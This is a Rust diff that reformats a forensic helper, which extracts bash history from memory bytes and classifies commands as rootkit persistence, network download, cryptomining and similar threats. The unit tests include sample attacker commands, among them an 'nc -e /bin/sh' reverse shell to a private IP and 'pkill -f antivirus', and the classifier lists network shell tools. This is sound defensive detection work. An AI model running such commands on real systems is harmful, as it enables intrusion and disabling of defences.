@@ -35,7 +35,10 @@ pub fn extract_bash_history_from_bytes(bytes: &[u8]) -> Vec<String> {
             continue;
         }
         // Only printable ASCII (0x20..=0x7E plus tab)
-        if !chunk.iter().all(|&b| b == b'\t' || (0x20..=0x7E).contains(&b)) {
+        if !chunk
+            .iter()
+            .all(|&b| b == b'\t' || (0x20..=0x7E).contains(&b))
+        {
             continue;
         }
         let s = match std::str::from_utf8(chunk) {
@@ -65,7 +68,10 @@ pub fn extract_bash_history_from_bytes(bytes: &[u8]) -> Vec<String> {
 /// - `"process_termination"` — `kill -9`, `pkill`
 pub fn classify_bash_command(cmd: &str) -> Option<&'static str> {
     // Check in specificity order so more-specific patterns win.
-    if cmd.contains("ld.so.preload") || cmd.to_lowercase().contains("ldpreload") || cmd.contains("LD_PRELOAD") {
+    if cmd.contains("ld.so.preload")
+        || cmd.to_lowercase().contains("ldpreload")
+        || cmd.contains("LD_PRELOAD")
+    {
         return Some("rootkit_persistence");
     }
     if cmd.contains("/dev/shm") || cmd.contains("/run/shm") {
@@ -75,8 +81,11 @@ pub fn classify_bash_command(cmd: &str) -> Option<&'static str> {
         return Some("file_deletion");
     }
     // network_download before cryptomining: URLs may contain "xmrig" as a path segment
-    if cmd.contains("wget ") || cmd.contains("curl ") || cmd.starts_with("nc ")
-        || cmd.contains(" nc ") || cmd.contains("ncat ")
+    if cmd.contains("wget ")
+        || cmd.contains("curl ")
+        || cmd.starts_with("nc ")
+        || cmd.contains(" nc ")
+        || cmd.contains("ncat ")
     {
         return Some("network_download");
     }
@@ -109,7 +118,10 @@ mod tests {
     fn extract_nul_separated_commands() {
         let input = b"ls -la\0rm -rf /tmp/kit\0";
         let result = extract_bash_history_from_bytes(input);
-        assert!(result.contains(&"ls -la".to_string()), "must contain 'ls -la'");
+        assert!(
+            result.contains(&"ls -la".to_string()),
+            "must contain 'ls -la'"
+        );
         assert!(
             result.contains(&"rm -rf /tmp/kit".to_string()),
             "must contain 'rm -rf /tmp/kit'"
@@ -131,8 +143,14 @@ mod tests {
         let input = b"ls\0pwd\0id\0";
         let result = extract_bash_history_from_bytes(input);
         // "ls" and "id" are 2 chars; only "pwd" (3 chars) passes the threshold
-        assert!(!result.contains(&"ls".to_string()), "'ls' is 2 chars, must be filtered");
-        assert!(!result.contains(&"id".to_string()), "'id' is 2 chars, must be filtered");
+        assert!(
+            !result.contains(&"ls".to_string()),
+            "'ls' is 2 chars, must be filtered"
+        );
+        assert!(
+            !result.contains(&"id".to_string()),
+            "'id' is 2 chars, must be filtered"
+        );
         assert!(result.contains(&"pwd".to_string()));
     }
 
@@ -156,12 +174,18 @@ mod tests {
 
     #[test]
     fn classify_rm_rf_is_file_deletion() {
-        assert_eq!(classify_bash_command("rm -rf /tmp/kit"), Some("file_deletion"));
+        assert_eq!(
+            classify_bash_command("rm -rf /tmp/kit"),
+            Some("file_deletion")
+        );
     }
 
     #[test]
     fn classify_unlink_is_file_deletion() {
-        assert_eq!(classify_bash_command("unlink /tmp/evil"), Some("file_deletion"));
+        assert_eq!(
+            classify_bash_command("unlink /tmp/evil"),
+            Some("file_deletion")
+        );
     }
 
     #[test]
@@ -182,7 +206,10 @@ mod tests {
 
     #[test]
     fn classify_nc_is_network_download() {
-        assert_eq!(classify_bash_command("nc -e /bin/sh 10.0.0.1 4444"), Some("network_download"));
+        assert_eq!(
+            classify_bash_command("nc -e /bin/sh 10.0.0.1 4444"),
+            Some("network_download")
+        );
     }
 
     #[test]
@@ -232,26 +259,41 @@ mod tests {
 
     #[test]
     fn classify_kill_9_is_process_termination() {
-        assert_eq!(classify_bash_command("kill -9 1234"), Some("process_termination"));
+        assert_eq!(
+            classify_bash_command("kill -9 1234"),
+            Some("process_termination")
+        );
     }
 
     #[test]
     fn classify_pkill_is_process_termination() {
-        assert_eq!(classify_bash_command("pkill -f antivirus"), Some("process_termination"));
+        assert_eq!(
+            classify_bash_command("pkill -f antivirus"),
+            Some("process_termination")
+        );
     }
 
     #[test]
     fn classify_chmod_x_is_permission_change() {
-        assert_eq!(classify_bash_command("chmod +x /tmp/evil"), Some("permission_change"));
+        assert_eq!(
+            classify_bash_command("chmod +x /tmp/evil"),
+            Some("permission_change")
+        );
     }
 
     #[test]
     fn classify_chmod_777_is_permission_change() {
-        assert_eq!(classify_bash_command("chmod 777 /tmp/evil"), Some("permission_change"));
+        assert_eq!(
+            classify_bash_command("chmod 777 /tmp/evil"),
+            Some("permission_change")
+        );
     }
 
     #[test]
     fn classify_cryptonight_is_cryptomining() {
-        assert_eq!(classify_bash_command("./cryptonight --threads 4"), Some("cryptomining"));
+        assert_eq!(
+            classify_bash_command("./cryptonight --threads 4"),
+            Some("cryptomining")
+        );
     }
 }
